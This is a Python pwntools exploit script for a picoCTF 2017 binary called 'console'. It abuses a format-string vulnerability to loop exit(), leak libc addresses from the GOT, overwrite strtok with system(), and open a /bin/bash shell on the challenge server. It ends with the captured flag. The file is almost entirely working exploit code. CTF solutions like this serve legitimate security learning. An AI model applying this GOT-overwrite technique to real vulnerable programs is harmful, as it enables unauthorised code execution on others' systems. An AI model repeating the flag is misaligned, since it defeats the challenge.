#! /usr/bin/env python2

from pwn import *

loop = 0x4009bd
fmt_param_num = 30
fmt_start = 14
off_libc_start_main = 0x21a50
off_system = 0x41490
libc_base = 0

def pad(r, param, val):
    r.sendline("h AAAAAA" + "AAAAAAAA" * (param - fmt_start - 1) + val)

if args['REMOTE']:
    r = remote("shell2017.picoctf.com", 42132)
else:
    r = process(argv=["./console", "log"], executable="./console")

# rewrite exit(0) as loop()
r.recvuntil("Config action: ")
pad(r, 30, p64(0x601258) + p64(0x60125a) + p64(0x60125c))
r.recvuntil("Config action: ")
r.sendline("e %32$n%64x%31$hn%2429x%30$hn")

# leak __libc_start_main
p__libc_start_main = 0x601228
x = ""
r.recvuntil("Config action: ")
for i in xrange(8):
    pad(r, 30, p64(p__libc_start_main + i))
    r.recvuntil("Config action: ")
    r.sendline("e %30$s")
    r.recvline()
    v = r.recvuntil("Config action: ")
    if v == "Config action: ":
        x += "\x00"
    else:
        x += v[0]
__libc_start_main = u64(x)
print "__libc_start_main = {}".format(hex(__libc_start_main))

# leak printf
p_printf = 0x601220
x = ""
for i in xrange(8):
    pad(r, 30, p64(p_printf + i))
    r.recvuntil("Config action: ")
    r.sendline("e %30$s")
    r.recvline()
    v = r.recvuntil("Config action: ")
    if v == "Config action: ":
        x += "\x00"
    else:
        x += v[0]
printf = u64(x)
print "printf            = {}".format(hex(printf))

# leak strtok
p_strtok = 0x601250
x = ""
for i in xrange(8):
    pad(r, 30, p64(p_strtok + i))
    r.recvuntil("Config action: ")
    r.sendline("e %30$s")
    r.recvline()
    v = r.recvuntil("Config action: ")
    if v == "Config action: ":
        x += "\x00"
    else:
        x += v[0]
strtok = u64(x)
print "strtok            = {}".format(hex(strtok))

libc_base = __libc_start_main - off_libc_start_main
system = libc_base + off_system
print "system            = {}".format(hex(system))

pad(r, 30, p64(0x601250) + p64(0x601252))
r.recvuntil("Config action: ")

pl = "e "
w = sorted([(system & 0x0000ffff, 30), ((system & 0xffff0000) >> 16, 31)], key=lambda x: x[0])
cnt = 0
for bit, target in w:
    bit -= cnt
    pl += "%{}x%{}$hn".format(bit, target)
    cnt += bit
print "pl = {}".format(pl)
r.sendline(pl)

r.recvuntil("Config action: ")
r.sendline("/bin/bash")

r.interactive()

# flag: 5132119511fbbaec6b32bc3080255f5f
